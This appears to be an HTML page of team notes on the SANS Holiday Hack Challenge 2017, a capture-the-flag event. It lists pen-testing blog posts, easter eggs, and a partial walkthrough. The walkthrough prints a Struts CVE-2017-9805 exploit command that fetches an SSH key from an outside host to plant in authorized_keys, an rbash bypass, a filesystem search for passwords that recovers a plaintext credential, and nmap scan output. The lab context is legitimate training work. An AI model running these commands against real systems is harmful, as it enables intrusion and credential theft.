<li>Which character is ultimately the villain causing the giant snowball
problem. What is the villain's motive?
</li>
</ol>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-6-9-1-2" name="sec-6-9-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
Do we know anything about this system already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.
</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML
</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
</li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
</li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee
</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection
</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan
</li>
</ul>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-6-9-1-3" name="sec-6-9-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-6-9-1-4" name="sec-6-9-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-6-9-1-5" name="sec-6-9-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
Summarize the reference solution that we found
</p>
</div>
</li>

<li><a id="alternatives" name="alternatives"></a><a id="sec-6-9-1-6" name="sec-6-9-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">

<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-9-1-7" name="sec-6-9-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">

<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-9-1-8" name="sec-6-9-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">

<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li></ul>
</div>
</div>
</div>
<div id="outline-container-sec-7" class="outline-2">
<h2 id="sec-7">Easter Eggs</h2>
<div class="outline-text-2" id="text-7">
</div><div id="outline-container-title" class="outline-3">
<h3 id="title"><a id="sec-7-1" name="sec-7-1"></a>Easter Eggs</h3>
<div class="outline-text-3" id="text-title">
</div>

<div id="outline-container-sec-7-1-1" class="outline-4">
<h4 id="sec-7-1-1">Story Page</h4>
</div>
</div>

<div id="outline-container-sec-7-2" class="outline-3">
<h3 id="sec-7-2">Wintered logo is based on the Wicked stage musical poster.</h3>
</div>
<div id="outline-container-sec-7-3" class="outline-3">
<h3 id="sec-7-3">Short video is based on video intro to Rudolph the Red-Nosed Reindeer</h3>
<div class="outline-text-3" id="text-7-3">
<iframe width="560" height="315" src="https://www.youtube.com/embed/g9ByiEGfAXk?rel=0&amp;start=99" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen></iframe>
</div>

<div id="outline-container-sec-7-3-1" class="outline-4">
<h4 id="sec-7-3-1">North Pole and Beyond</h4>
<div class="outline-text-4" id="text-7-3-1">
</div><ul class="org-ul"><li><a id="sec-7-3-1-1" name="sec-7-3-1-1"></a>Games<br  /></li>

<li><a id="sec-7-3-1-2" name="sec-7-3-1-2"></a>Scoreboard<br  /></li>

<li><a id="sec-7-3-1-3" name="sec-7-3-1-3"></a>Stocking<br  /><div class="outline-text-5" id="text-7-3-1-3">
<p>
The text field for entering the SHA1 hashes of the great book pages appears to have some placeholder text in it, <code>686579212121202d436f756e746572204861636b</code>. This is in hex and can be converted to ascii, <code>hey!!! -Counter Hack</code>.
</p>
</div>
</li></ul>
</div>
</div>
</div>
<div id="outline-container-sec-8" class="outline-2">
<h2 id="sec-8"><span class="todo TODO">TODO</span> Misc</h2>
<div class="outline-text-2" id="text-8">
<p>
Need to add this content elsewhere
</p>
</div>
<div id="outline-container-sec-8-1" class="outline-3">
<h3 id="sec-8-1">Let the Hack Begin!</h3>
<div class="outline-text-3" id="text-8-1">
</div><div id="outline-container-sec-8-1-1" class="outline-4">
<h4 id="sec-8-1-1">Gaining Access to L2S</h4>
<div class="outline-text-4" id="text-8-1-1">
<p>
The SAN cert showed it the was the same as dev.northpolechristmastown.com.
</p>

<p>
TODO: Justin - how did you figure out it was Struts?
</p>

<p>
Used the Python tool in the SANS blog post:
</p>

<div class="org-src-container">

<pre class="src src-sh">python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c <span style="font-style: italic;">'mkdir /home/alabaster_snowball/.ssh; cd /home/alabaster_snowball/.ssh; wget http://1.2.3.4/a.key -O authorized_keys; chmod 600 authorized_keys; chmod 700 .'</span>
</pre>
</div>
</div>

<ul class="org-ul"><li><a id="sec-8-1-1-1" name="sec-8-1-1-1"></a>Finding the password for alabaster_snowball<br  /><div class="outline-text-5" id="text-8-1-1-1">
<p>
Login using ssh, but explicitly run bash, bypassing the rbash restriction
</p>

<div class="org-src-container">

<pre class="src src-sh">$ ssh alabaster_snowball@dev.northpolechristmastown.com -t bash
</pre>
</div>

<p>
First, fix the shells path.  We can grab what a normal path looks like from /etc/profile:
</p>

<div class="org-src-container">

<pre class="src src-sh">alabaster_snowball@l2s:~$ grep PATH /etc/profile
  <span style="font-weight: bold; font-style: italic;">PATH</span>=<span style="font-style: italic;">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
  <span style="font-weight: bold; font-style: italic;">PATH</span>=<span style="font-style: italic;">"/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"</span>
<span style="font-weight: bold;">export</span> PATH
alabaster_snowball@l2s:~$ <span style="font-weight: bold; font-style: italic;">PATH</span>=<span style="font-style: italic;">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
</pre>
</div>

<p>
Find all small files owned by alabaster_snowball on the main filesystem and search them for the string password.
Start small and double the filesize each time to keep the process fast.
</p>

<div class="org-src-container">

<pre class="src src-sh">alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -1k 2&gt;/dev/null |xargs grep passwor
alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -2k 2&gt;/dev/null |xargs grep passwor
alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -4k 2&gt;/dev/null |xargs grep passwor
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
</pre>
</div>

<p>
We could have also searched for the username to find intersting files:
</p>

<div class="org-src-container">

<pre class="src src-sh">$ time grep alabaster_snowball -r /opt/
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;

real       0m0.355s
user       0m0.300s
sys        0m0.052s
</pre>
</div>
</div>
</li></ul>
</div>
</div>

<div id="outline-container-sec-8-2" class="outline-3">
<h3 id="sec-8-2">Using ripgrep</h3>
<div class="outline-text-3" id="text-8-2">
<p>
Ripgrep is a super fast grep replacement written in rust.
It does a better job at filtering binary files, so we can run this command that finishes in about a second:
</p>

<div class="org-src-container">

<pre class="src src-sh">$ mkdir /tmp/.rg
$ cd /tmp/.rg
$ wget https://github.com/BurntSushi/ripgrep/releases/download/0.7.1/ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz
$ tar xvzf ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz
$ find / -type f -xdev -user alabaster_snowball 2&gt;/dev/null | xargs ./ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster -A 1
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
3:            final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;
4-            final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
</pre>
</div>

<p>
If we didn't think to only look in our files, it only takes 4 seconds to search
the entire filesystem.  After ignoring proc and some debian package info, only
a few lines are output.
</p>

<div class="org-src-container">

<pre class="src src-sh">$ time ./ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster / --no-messages |grep -v /proc|grep -v deb.debian.org
/etc/crontab:#@reboot root /usr/bin/nohup /usr/bin/sudo -u alabaster_snowball /opt/apache-tomcat/start_tomcat.sh &amp;
/etc/subuid:alabaster_snowball:296608:65536
/etc/passwd:alabaster_snowball:x:1003:1004:Alabaster Snowball,,,:/home/alabaster_snowball:/bin/rbash
/etc/group:alabaster_snowball:x:1004:
/etc/subgid:alabaster_snowball:296608:65536
/etc/systemd/system/tomcat.service:<span style="font-weight: bold; font-style: italic;">User</span>=alabaster_snowball
/etc/systemd/system/tomcat.service:<span style="font-weight: bold; font-style: italic;">Group</span>=alabaster_snowball
/usr/share/dh-python/dist/cpython3_fallback:alabaster python3-alabaster
/usr/share/dh-python/dist/cpython2_fallback:alabaster python-alabaster
/usr/lib/google-cloud-sdk/platform/gsutil/third_party/pyasn1/doc/source/conf.py:# html_theme = <span style="font-style: italic;">'alabaster'</span>
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;

real       0m4.095s
user       0m1.864s
sys        0m18.808s
</pre>
</div>

<p>
Basic hostname enumeration:
</p>

<pre class="example">
$ nmap -sL 10.142.0.*|fgrep '('
Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-18 02:20 UTC
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
Nmap done: 256 IP addresses (0 hosts up) scanned in 0.01 seconds
</pre>

<p>
Even without scanning any ports, we can guess what hhc17-smb-server does!
</p>

<div class="org-src-container">

<pre class="src src-sh">ssh l2s | tee nmap.out
</pre>
</div>

<pre class="example">
Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-15 02:26 UTC
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Host is up (0.00020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open  http     nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.10.3
|_http-title: Did not follow redirect to https://hhc17-l2s-proxy.c.holidayhack2017.internal/
443/tcp  open  ssl/http nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3
|_http-title: Toys List
| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Issuer: commonName=Let's Encrypt Authority X3/organizationName=Let's Encrypt/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-11-29T12:54:54
| Not valid after:  2018-02-27T12:54:54
| MD5:   90b5 5b73 6e21 e00f 0247 b22d a1ec f953
|_SHA-1: c089 30bf cd61 3a55 ea8f f419 2542 b9b4 9823 8fb1
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
2222/tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Host is up (0.00017s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp open  http    nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3
|_http-title: Toys List
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Host is up (0.00021s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ac:cc:7c:b1:cb:56:0b:bc:cd:05:12:36:e7:24:ca (RSA)
|_  256 9f:4e:9a:ee:dc:ef:f4:4b:6d:1b:03:58:bb:5d:a2:87 (ECDSA)
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp   open  http    nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/cookie.txt
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
143/tcp  open  imap    Dovecot imapd
|_imap-capabilities: OK ID IDLE LITERAL+ AUTH=PLAIN more have capabilities listed post-login LOGIN-REFERRALS Pre-login AUTH=LOGINA0001 ENABLE SASL-IR IMAP4rev1
2525/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
3000/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/cookie.txt
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: Host:  mail.northpolechristmastown.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Host is up (0.00017s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 33:fb:b7:35:b5:7a:72:6f:06:91:21:ff:e2:3e:86:79 (RSA)
|_  256 70:71:ea:71:cd:83:d8:47:29:ef:6f:69:f3:8a:ed:a2 (ECDSA)
80/tcp   open  http    nginx 1.10.3
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| http-robots.txt: 1 disallowed entry 
|_/dev
|_http-server-header: nginx/1.10.3
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://edb.northpolechristmastown.com/index.html
389/tcp  open  ldap
| fingerprint-strings: 
|   LDAPBindReq: 
|     Version 2 not supported
|   LDAPSearchReq: 
|     supportedLDAPVersion1
|     namingContexts1
|     dc=com0/
|     supportedExtension1
|_    1.3.6.1.4.1.4203.1.11.10
8080/tcp open  http    Werkzeug httpd 0.12.2 (Python 2.7.13)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| http-robots.txt: 1 disallowed entry 
|_/dev
|_http-server-header: Werkzeug/0.12.2 Python/2.7.13
|_http-title: Did not follow redirect to http://edb.northpolechristmastown.com/index.html
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port389-TCP:V=7.40%I=7%D=12/15%Time=5A3332D9%P=x86_64-pc-linux-gnu%r(LD
SF:APSearchReq,83,"0s\x02\x01\x07dn\x04\x000j0\x1b\x04\x14supportedLDAPVer
SF:sion1\x03\x04\x0130\x1a\x04\x0enamingContexts1\x08\x04\x06dc=com0/\x04\
SF:x12supportedExtension1\x19\x04\x171\.3\.6\.1\.4\.1\.4203\.1\.11\.10\x0c
SF:\x02\x01\x07e\x07\n\x01\0\x04\0\x04\0")%r(LDAPBindReq,25,"0#\x02\x01\x0
SF:1a\x1e\n\x01\x02\x04\0\x04\x17Version\x202\x20not\x20supported");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
Host is up (0.00081s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-smb-server
| Issuer: commonName=hhc17-smb-server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-11-06T13:46:55
| Not valid after:  2018-05-08T13:46:55
| MD5:   092f 018a 083a b87a 8186 ecac da4e 09e2
|_SHA-1: 0a0d f4e6 765f 1818 cd32 4bf2 5212 e8ca ef51 5c38
|_ssl-date: 2017-12-15T02:27:40+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Host is up (0.00014s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp open  http    nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3
|_http-title: Toys List
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
Host is up (0.00089s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Index - North Pole Engineering Presents: EaaS!
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hhc17-elf-manufacturing
| Issuer: commonName=hhc17-elf-manufacturing
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-11-23T20:53:55
| Not valid after:  2018-05-25T20:53:55
| MD5:   a711 f240 0c9e a8cd 3be4 81fa fa16 f15a
|_SHA-1: 5728 6c5d 2ec0 6657 629b f9f4 72aa 0b3d 12d4 b3a5
|_ssl-date: 2017-12-15T02:27:40+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
Initiating NSE at 02:27
Completed NSE at 02:27, 0.00s elapsed
Initiating NSE at 02:27
Completed NSE at 02:27, 0.00s elapsed
Post-scan script results:
| clock-skew: 
|   0s: 
|     10.142.0.13 (eaas.northpolechristmastown.com)
|_    10.142.0.8 (hhc17-emi.c.holidayhack2017.internal)
| ssh-hostkey: Possible duplicate hosts
| Key 2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA) used by:
|   10.142.0.2
|   10.142.0.3
|   10.142.0.11
| Key 256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA) used by:
|   10.142.0.2
|   10.142.0.3
|_  10.142.0.11
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (7 hosts up) scanned in 86.82 seconds
</pre>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="author">Author: Vlad Grigorescu</p>
<p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 25.3.1 (<a href="http://orgmode.org">Org</a> mode 8.2.10)</p>
<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
